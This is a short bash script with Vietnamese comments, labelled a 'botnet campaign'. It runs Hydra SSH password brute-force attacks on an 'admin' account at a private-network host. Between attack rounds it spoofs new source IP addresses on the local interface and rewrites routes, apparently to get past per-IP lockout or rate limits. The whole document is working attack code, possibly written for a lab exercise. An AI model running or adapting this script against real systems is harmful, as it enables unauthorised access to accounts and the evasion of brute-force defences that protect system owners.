#!/bin/bash

# --- CẤU HÌNH ---
TARGET="192.168.73.137" 
PASS_FILE="test_medium.txt"
IFACE="eth0"

echo "=========================================="
echo "    CHIẾN DỊCH BOTNET V4 (ROUTING HACK)"
echo "=========================================="

# Dọn dẹp rác của Hydra (QUAN TRỌNG ĐỂ KHÔNG BỊ KẸT 10 GIÂY)
rm -f ./hydra.restore
sudo killall hydra 2>/dev/null
sudo ip route del $TARGET 2>/dev/null
sudo ip addr del 192.168.73.135/24 dev $IFACE 2>/dev/null
sudo ip addr del 192.168.73.136/24 dev $IFACE 2>/dev/null

# ---------------------------------------------------------
# PHASE 1: TẤN CÔNG TỪ IP GỐC (.134)
# ---------------------------------------------------------
echo ""
echo "[1/3] Tấn công từ IP GỐC (.134)..."
# ĐÃ SỬA: Thêm cờ -I để Hydra bắn ngay lập tức
hydra -I -l admin -P $PASS_FILE ssh://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID1=$!
echo "      -> Đợi 10s..."
sleep 10
sudo kill $PID1 2>/dev/null

# ---------------------------------------------------------
# PHASE 2: TẤN CÔNG TỪ .135
# ---------------------------------------------------------
echo ""
echo "[2/3] Giả danh IP .135..."
sudo ip addr add 192.168.73.135/24 dev $IFACE
sudo ip route add $TARGET dev $IFACE src 192.168.73.135

hydra -I -l admin -P $PASS_FILE ssh://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID2=$!
sleep 10
sudo kill $PID2 2>/dev/null

sudo ip route del $TARGET 2>/dev/null
sudo ip addr del 192.168.73.135/24 dev $IFACE 2>/dev/null

# ---------------------------------------------------------
# PHASE 3: TẤN CÔNG TỪ .136
# ---------------------------------------------------------
echo ""
echo "[3/3] Giả danh IP .136..."
sudo ip addr add 192.168.73.136/24 dev $IFACE
sudo ip route add $TARGET dev $IFACE src 192.168.73.136

hydra -I -l admin -P $PASS_FILE ssh://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID3=$!
sleep 10
sudo kill $PID3 2>/dev/null

sudo ip route del $TARGET 2>/dev/null
sudo ip addr del 192.168.73.136/24 dev $IFACE 2>/dev/null

echo ""
echo "[DONE] Đã hoàn tất."

